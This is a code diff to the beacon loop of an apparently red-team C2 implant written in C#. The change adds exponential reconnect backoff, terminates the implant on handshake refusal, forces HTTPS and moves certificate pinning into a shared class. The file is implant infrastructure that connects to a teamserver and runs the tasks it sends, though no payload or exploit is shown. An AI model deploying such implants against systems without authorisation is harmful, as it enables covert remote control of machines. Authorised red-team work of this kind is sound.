@@ -98,13 +98,15 @@ internal sealed class Beacon
     /// <summary>
     /// Blocks until cancellation or the kill date passing. Reconnects after a
     /// jittered sleep when the stream drops (implants are connection initiators;
-    /// flapping is expected and handled by reconnecting, architecture.md Sec 8).
-    /// The kill date is checked at the top of each cycle so a long-running implant
-    /// self-terminates once it passes, not only on the next restart
-    /// (architecture.md Sec 7).
+    /// flapping is expected and handled by reconnecting, architecture.md Sec 8),
+    /// backing off exponentially over consecutive failures so a down teamserver
+    /// is not hammered at beacon rate. The kill date is checked at the top of
+    /// each cycle so a long-running implant self-terminates once it passes, not
+    /// only on the next restart (architecture.md Sec 7).
     /// </summary>
     public async Task RunAsync(CancellationToken cancellationToken)
     {
+        var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
         {
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
@@ -112,9 +114,10 @@ internal sealed class Beacon
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                 return;
             }
+            var cycle = BeaconCycleResult.Dropped;
             try
             {
-                await RunOnceAsync(cancellationToken);
+                cycle = await RunOnceAsync(cancellationToken);
             }
             catch (OperationCanceledException)
             {
@@ -128,9 +131,17 @@ internal sealed class Beacon
             {
                 _log.WriteLine($"beacon stream ended: {ex.Message}");
             }
+
+            // A handshake refusal is permanent for this artifact (retired, kill
+            // date expired, unknown implant -- none of them change on a retry),
+            // so the loop ends there instead of reconnecting forever.
+            if (cycle == BeaconCycleResult.Terminal)
+                return;
+
+            consecutiveFailures = cycle == BeaconCycleResult.Handshaken ? 0 : consecutiveFailures + 1;
             try
             {
-                await SleepWithJitterAsync(cancellationToken);
+                await SleepWithJitterAsync(consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
@@ -139,9 +150,25 @@ internal sealed class Beacon
         }
     }
 
-    // One connect-handshake-task cycle. Returns when the stream ends (clean close,
-    // transport error, or handshake refusal -- the caller logs and reconnects).
-    private async Task RunOnceAsync(CancellationToken cancellationToken)
+    // What one connect-handshake-task cycle produced, driving the reconnect
+    // policy in RunAsync.
+    private enum BeaconCycleResult
+    {
+        // The cycle never reached a handshake (a transport drop); retry.
+        Dropped,
+
+        // The handshake succeeded and the stream ran; reset the failure counter.
+        Handshaken,
+
+        // The server refused the handshake permanently; the caller terminates.
+        Terminal,
+    }
+
+    // One connect-handshake-task cycle. Returns how the cycle ended so the
+    // caller can distinguish a transport drop (retry) from a handshake refusal
+    // (permanent). Throws on transport errors, which the caller logs and
+    // retries.
+    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
     {
         using var handler = new SocketsHttpHandler();
         var pinned = new X509Certificate2Collection();
@@ -151,13 +178,13 @@ internal sealed class Beacon
         {
             ClientCertificates = new X509Certificate2Collection(_leaf),
             RemoteCertificateValidationCallback = (_, cert, chain, errors) =>
-                PinServerChain(cert, chain, pinned),
+                C2.PinServerChain(cert as X509Certificate2, chain, pinned),
         };
 
         // grpc-dotnet takes the channel address; HTTPS transport security comes
         // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
         // as "host:port" (no scheme); prepend https:// so the channel builder
-        // accepts it. Mirrors the Go client's grpcTarget normalization.
+        // accepts it.
         var address = GrpcAddress(_beaconUrl);
         using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
         {
@@ -180,7 +207,14 @@ internal sealed class Beacon
             throw new RpcException(new Status(StatusCode.Unavailable, "handshake: stream closed"));
         var hs = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
         if (hs.Status != HandshakeStatus.Ok)
-            throw new RpcException(new Status(StatusCode.PermissionDenied, $"handshake refused: {hs.Status}"));
+        {
+            // Every non-OK handshake status (unknown implant, kill date expired,
+            // retired, identity/version mismatch) is permanent for this artifact:
+            // retrying would not change the answer, so terminate instead of
+            // reconnecting forever.
+            _log.WriteLine($"handshake refused: {hs.Status}; terminating");
+            return BeaconCycleResult.Terminal;
+        }
         _log.WriteLine($"handshake ok: engagement={hs.EngagementId}");
 
         // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult up.
@@ -214,12 +248,22 @@ internal sealed class Beacon
                 });
             }
         }
+
+        return BeaconCycleResult.Handshaken;
     }
 
-    // Sleeps for the base interval +/- jitter/2, honoring cancellation.
-    private async Task SleepWithJitterAsync(CancellationToken cancellationToken)
+    // The failure counter's doubling cap: the reconnect delay grows as
+    // base * 2^failures up to 16x, keeping a down teamserver from being polled
+    // at beacon rate forever.
+    private const int MaxBackoffExponent = 4;
+
+    // Sleeps for the base interval (doubled per consecutive failure, capped)
+    // +/- jitter/2, honoring cancellation.
+    private async Task SleepWithJitterAsync(int consecutiveFailures, CancellationToken cancellationToken)
     {
         var d = _sleep;
+        for (var i = 0; i < Math.Min(consecutiveFailures, MaxBackoffExponent); i++)
+            d += d;
         if (_jitter > TimeSpan.Zero)
         {
             var deltaTicks = (long)(Random.Shared.NextDouble() * _jitter.Ticks) - _jitter.Ticks / 2;
@@ -231,8 +275,10 @@ internal sealed class Beacon
     }
 
     // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
-    // scheme is required, so "host:port" becomes "https://host:port". Any trailing
-    // path is dropped -- gRPC uses the :authority, not a path.
+    // scheme is required, so "host:port" becomes "https://host:port" and an
+    // explicit http:// is upgraded to https:// (the beacon channel is always
+    // mTLS; a plaintext URL is a mistake, not a downgrade). Any trailing path is
+    // dropped -- gRPC uses the :authority, not a path.
     private static string GrpcAddress(string beaconUrl)
     {
         var u = beaconUrl.Trim();
@@ -244,35 +290,5 @@ internal sealed class Beacon
         if (slash >= 0)
             u = u[..slash];
         return $"https://{u}";
-    }
-
-    // Accepts the peer certificate iff it chains to one of the pinned CAs. The
-    // dev teamserver presents the CA certificate itself as its server identity
-    // (TransportHost.ConfigureMtlsHttps), and that CA cert carries no Subject
-    // Alternative Names -- standard name verification would reject it. The
-    // implant pins the CA explicitly, so the security property is
-    // chain-to-pinned-CA, not DNS name match -- the same shape the C# server side
-    // uses (ClientCertificateChainsToCa) and the Go implant uses
-    // (verifyChain). Mirrored here for the implant's side of the stream.
-    private static bool PinServerChain(
-        object? certificate,
-        X509Chain? chain,
-        X509Certificate2Collection pinned)
-    {
-        if (certificate is not X509Certificate2 cert || chain is null)
-            return false;
-        chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
-        chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
-        foreach (X509Certificate2 ca in pinned)
-            chain.ChainPolicy.ExtraStore.Add(ca);
-        if (!chain.Build(cert))
-            return false;
-        if (chain.ChainElements.Count == 0)
-            return false;
-        var root = chain.ChainElements[^1].Certificate;
-        foreach (X509Certificate2 ca in pinned)
-            if (root.Thumbprint == ca.Thumbprint)
-                return true;
-        return false;
     }
 }
